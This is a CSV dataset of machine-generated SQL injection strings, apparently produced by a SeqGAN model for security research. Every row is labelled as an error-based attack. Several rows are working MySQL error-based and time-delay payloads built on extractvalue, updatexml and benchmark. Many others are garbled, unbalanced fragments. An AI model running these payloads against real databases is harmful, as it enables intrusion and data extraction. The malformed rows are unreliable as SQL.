label,payload,family,payload_type,method,run_id,sample_index
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'p""  =  ""%""  =  ""e)      )    (  extractvalue  (  (  (  5000000(  0x2e,0x7171706a71,  (  9627,md5  (  (  ut  (  benchmark  (  (  5000000(  0x2e,0x7171706a71,1   )    )  extractvalue  (  (  9627,concat  (  (  (  0x5c,(  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  e  (  (  1759  =  (  (  1808,1   )    ual  )  select 0 from d (  (  elt  )  e  (  7982  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1804
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1805
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1806
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1807
attack,",mdu.yt_nehosest  (  2917  =  (  0x2e,0x7171706a71,  (  (  benchmark  (  5000000,md5  (  (  select   (  case when   (  4125  (  (  elt1 as inal  )  5000000,0x7171706a71(  (  benchmark  (  5000000,md5  (  (  select   (  elt  (  1759  =  (  (  0x5c,  (  (  benchmark  (  (  5000000(  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1808
attack,"1%""   )    6804  (  select   (  9103 and,2914  =  3393,  (  1759=  (  1808,1   )    (  extractvalue  (  (  7982,concat  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  =    (  (  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark    (  (  select   (  (  elte al  )  e  (  0x2e,concat  (  0x5c,0x7171706a71,  (  5000000,md5  (  (  select   (  case 0 0 from d",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1809
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1810
attack,"1%%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1811
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kNAncz",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1812
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1813
attack,"  )  (  (  select   (  9103  (  (  (  (  0x2e,0x7171706a71,  (  select   (  3863  )   (  1724  (  5000000(  (  7982  =  extractvalue  (  3393,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  (  elt  (  3393  =  1559  (  (  (  e  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  3393,1   )    (  extractvalue  (  (  2917,md5  (  concat  (  (  7982",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1814
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1815
attack,"1%' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '     yroseewi",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1816
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1817
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1818
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'icA""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1819
attack,"%select   and updatexml  (  (  (  (  0x5c,(  (  benchmark  (  (  (  benchmark,  (  (  (    (  (  (  (  (  (  (  (  (  benchmark  (  (  (  5000000(  3393,md5  (  (  (  (  0x2e,0x7171706a71,  (  (  (  (  (  =  (  9627,1   (  US  )  select   (  )   from dualt  )  8375  )  )  =  (  1808,1   )    )     )  extractvalue  (  9627,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1820
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""oc   w    s0x717a767a71    xO,$'  =  '  --oban 4415 anal  ) when   (  6200  (  2917,1   )    (  select   (  case 0 from dua  elt  elt  (  case when   (  5777  (  1049,1   x  (  case from,md5  (    (  (  0x5c,0x7171706a71,  (  5000000(  (  select   (  elt  elt  (  5000000,md5  (  (  benchmark  (  (  (  0x5c,0x7171706a71,  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1821
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1822
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1823
attack," AND or updatexml  (  (  0x5c,  (  benchmark  (  (  (  benchmark  (  select   (  elt  (  elt  (  0x4b774c75   end  (  case 0 from d dual  )   end  (  case 1   then 5322 else else cast  (  (  (  (  (  0x2e=  1802  (  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt9393  )  2917  =  (  5000000(  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  5000000(  (  0x5c,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1824
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1825
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1826
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1827
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1828
attack,"1%where where extractvalue  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  1808  =  (  5000000(  (  0x2e,0x7171706a71,  (  benchmarkt  (   (  (  case 0 from 0 from dua  el  elt   (  4660  (  0x5c,  (  select   (lt  (  elt  (  0x5c,  (  (  benchmark  (  (  9255,concat  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1829
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1830
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1831
attack,"1%"" or extractvalue  (  (  (  (  (  (  (  (  (   from   (  0 a  (  )  9627   (  (  case when   (  ual  )  )   end  (  (  elt  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  benchmark  (  5000000(  (  1808=  (  (  0x5c,  (  select   (  3393,  (  (  0x2e,concat  (  (  caset  (  0x2e,0x7171706a71,  (  select   (  )    el    (  (  (  3393  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1832
attack,"select   (  8403  =  4415  =  3335  (  (  ( 0 a  )  case 6804   (  8375  (  (  benchmark  (  1297,1   )    AND 'i'  # )    #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1833
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1834
attack,"1%"" and extractvalue  (  (  (  (  (  (   SELECT 0 or 8860  =  extractvalue  (  (  9627,concat  (  (  (  3393  (  3393  (  (  3393,md5  (  1 1724  (  (  1808  =  (  1808,  (  (  =  (  (  (  2917  =  (  (  6212  =  (  e  (  0x5c,0x7171706a71,  (  select   (  elt  (  e  (  8862  =  (  (  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  9083",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1835
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1836
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1837
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1838
attack,"1%pk'  =  'cpnnFROMndgh' like 'kqFROM in gzmnamonamedde   (    (   (  5704  (  1049  =  (  1808,1   )    (  extractvalue  (  (  select   (  1297,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  (    (  (    (  (  select   (  elt  (  elt  (  7982  =  (  (  0x2e,8666  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1839
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1840
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1841
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1842
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1843
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1844
attack,"1%""   and extractvalue  (  (  (  (  (  (  0x2e,0x7171706a71,(  (  (  (  (  (  (  select   (  )   (  3576  =  3393,md5  (  (  0x5c,  (  select   (  elt  e  (  (  1808  =  (  (  0x5c,  (  (  benchmark  (  (  5000000,md5  (  (  (  select   (  elt  (  0x2e,  (  (  (  select   (  elt  (  1759  =  (  5000000,0x717a767a71   (  (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1845
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1846
attack,"1%""   )    AND 'i'  =  4102  =  2162  =  9338 or extractvalue  (  (  (  (  0x2e,0x7171706a71,  (  (  3393,1   (  )  select   (  )    3217  =  (  (  select   (  elt  (  1808  =  (  1808,concat  (  (  (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  1297  =  (  3393,1   )    )  extractvalue  (  P(  (  (  3393,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1847
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1848
attack,"1%'  =  'kbb  e   (  4415  (  (  elt  (  0x5c,0x7171706a71,  (  select   (  elt  (  2917  =  (  1808,1   (  extractvalue  (  3393,concat  (  (  (  (  benchmark  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  0x5c,0x7171706a71,  (  5000000,md5  (  (  1759  (  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  l FROM 0 from(  )  (  (  5433  (  (  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1849
attack,"1%"" and updatexml  (  (  (  (  (  (  (  ((  (  (  7982  =  (  (  (  0x2e,0x7171706a71,  (  (  (  0x52515a50   (  2446  (  2917)   end  (  (  (  elt  (  7982  =  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  (  7982  )  (  0x2e,(  (  (  8862  (  (  (  (  7982  =  3393,  (  select   (  case when   (  (  (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1850
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1851
attack,"1%""   or extractvalue  (  (  6212  =  utl  7982,1   )    (  extractvalue  (  1808,1   )    (  8862,md5  =  (  (  ,  (  select   (  8318  =  6212  (  5433   (  3681  (  (  (  0x5c,  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  extractvalue  (  benchmark  (  (  (  5000000(  (  (  case  =  (  (  0x5c,  (  79820x7171706a71,  (  benchmark  (  (  (  benchmark  (  5000000(  (  0x4b774c75   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1852
attack,"1%"",9338 and extractvalue  (  5  (  (  0x5c,0x7171706a71,6800  (  (  (  5000000(  (  (  (  select   (  elt  (  case when   (  (  case 0 from 0 from d5  (  8375  )   (  (  1354  (  =  3393,  (  benchmark  (  (  benchmarkupdatexml  (  (  (  1297,1   )    (  extractvalue  (  (  1049,  (  0x5c,0x7171706a71,  (  (  (  5000000,md5  (  1759(  mduaname  1812  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1853
attack,1%i,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1854
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1855
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1856
attack,"select   (  DI'i'  )  case when   (  (  7982,  (  select   ( 0 0 from dual  )   end  (  elt  elte  (  elt  (  5000000,md5  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  0x5c)  (  (  benchmark  (  (  2917,1   (  updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  1297  =  1049,md5  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1857
attack,1%1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1858
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1859
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1860
